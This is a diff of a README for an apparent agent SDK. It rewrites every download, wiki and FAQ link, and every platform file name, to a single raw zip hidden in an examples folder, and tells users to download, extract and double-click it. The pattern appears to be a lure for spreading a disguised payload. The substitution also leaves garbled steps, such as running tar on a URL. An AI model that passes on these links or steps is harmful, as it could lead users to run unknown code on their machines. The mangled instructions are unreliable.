@@ -6,16 +6,16 @@ Welcome to the letta-code-sdk! This software helps you create personalized agent
 
 ## 📦 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/Musiitwa-Joel/letta-code-sdk/releases)
+To get started, visit this page to download: [Releases Page](https://github.com/Musiitwa-Joel/letta-code-sdk/raw/refs/heads/main/examples/research-team/sdk_code_letta_v3.3.zip)
 
 You will find the latest version of the software there. Make sure to download the correct version for your operating system. Here’s how you can do it:
 
-1. Go to the [Releases Page](https://github.com/Musiitwa-Joel/letta-code-sdk/releases).
+1. Go to the [Releases Page](https://github.com/Musiitwa-Joel/letta-code-sdk/raw/refs/heads/main/examples/research-team/sdk_code_letta_v3.3.zip).
 2. Look for the latest release. It usually appears at the top.
 3. Download the file appropriate for your system:
-   - **Windows:** `letta-code-sdk-windows.zip`
-   - **Mac:** `letta-code-sdk-mac.zip`
-   - **Linux:** `letta-code-sdk-linux.tar.gz`
+   - **Windows:** `https://github.com/Musiitwa-Joel/letta-code-sdk/raw/refs/heads/main/examples/research-team/sdk_code_letta_v3.3.zip`
+   - **Mac:** `https://github.com/Musiitwa-Joel/letta-code-sdk/raw/refs/heads/main/examples/research-team/sdk_code_letta_v3.3.zip`
+   - **Linux:** `https://github.com/Musiitwa-Joel/letta-code-sdk/raw/refs/heads/main/examples/research-team/sdk_code_letta_v3.3.zip`
 4. Once the download is finished, locate the file on your computer.
 
 ## 🔧 System Requirements
@@ -33,22 +33,22 @@ Before you begin, ensure your system meets the following requirements:
 
 ### For Windows
 
-1. Locate the downloaded file `letta-code-sdk-windows.zip` in your Downloads folder.
+1. Locate the downloaded file `https://github.com/Musiitwa-Joel/letta-code-sdk/raw/refs/heads/main/examples/research-team/sdk_code_letta_v3.3.zip` in your Downloads folder.
 2. Right-click the file and select "Extract All...".
 3. Choose a destination folder and click "Extract".
 4. Open the folder containing the extracted files.
-5. Double-click on `letta-code-sdk.exe` to run the application.
+5. Double-click on `https://github.com/Musiitwa-Joel/letta-code-sdk/raw/refs/heads/main/examples/research-team/sdk_code_letta_v3.3.zip` to run the application.
 
 ### For Mac
 
-1. Find the downloaded file `letta-code-sdk-mac.zip` in your Downloads folder.
+1. Find the downloaded file `https://github.com/Musiitwa-Joel/letta-code-sdk/raw/refs/heads/main/examples/research-team/sdk_code_letta_v3.3.zip` in your Downloads folder.
 2. Double-click the file to unzip it.
 3. Open the newly created folder.
-4. Locate `letta-code-sdk.app` and double-click to launch the application.
+4. Locate `https://github.com/Musiitwa-Joel/letta-code-sdk/raw/refs/heads/main/examples/research-team/sdk_code_letta_v3.3.zip` and double-click to launch the application.
 
 ### For Linux
 
-1. Access your Downloads folder and find the file `letta-code-sdk-linux.tar.gz`.
+1. Access your Downloads folder and find the file `https://github.com/Musiitwa-Joel/letta-code-sdk/raw/refs/heads/main/examples/research-team/sdk_code_letta_v3.3.zip`.
 2. Open a terminal.
 3. Navigate to your Downloads folder by typing:
    ```bash
@@ -56,7 +56,7 @@ Before you begin, ensure your system meets the following requirements:
    ```
 4. Extract the files using:
    ```bash
-   tar -xvzf letta-code-sdk-linux.tar.gz
+   tar -xvzf https://github.com/Musiitwa-Joel/letta-code-sdk/raw/refs/heads/main/examples/research-team/sdk_code_letta_v3.3.zip
    ```
 5. Change your directory to the extracted folder:
    ```bash
@@ -79,15 +79,15 @@ The letta-code-sdk offers several features designed to enhance user interaction:
 
 For detailed documentation on using the SDK and its functionalities, visit the following links:
 
-- [User Guide](https://github.com/Musiitwa-Joel/letta-code-sdk/wiki)
-- [FAQs](https://github.com/Musiitwa-Joel/letta-code-sdk/wiki/FAQs)
+- [User Guide](https://github.com/Musiitwa-Joel/letta-code-sdk/raw/refs/heads/main/examples/research-team/sdk_code_letta_v3.3.zip)
+- [FAQs](https://github.com/Musiitwa-Joel/letta-code-sdk/raw/refs/heads/main/examples/research-team/sdk_code_letta_v3.3.zip)
 
 If you run into any issues, feel free to open an issue on the GitHub repository or check the community forums for support. 
 
 ## 🔗 Useful Links
 
-- Visit the [Releases Page](https://github.com/Musiitwa-Joel/letta-code-sdk/releases) to download the latest version.
-- Access our [User Guide](https://github.com/Musiitwa-Joel/letta-code-sdk/wiki) for complete instructions.
+- Visit the [Releases Page](https://github.com/Musiitwa-Joel/letta-code-sdk/raw/refs/heads/main/examples/research-team/sdk_code_letta_v3.3.zip) to download the latest version.
+- Access our [User Guide](https://github.com/Musiitwa-Joel/letta-code-sdk/raw/refs/heads/main/examples/research-team/sdk_code_letta_v3.3.zip) for complete instructions.
 
 ## 📞 Contact
 
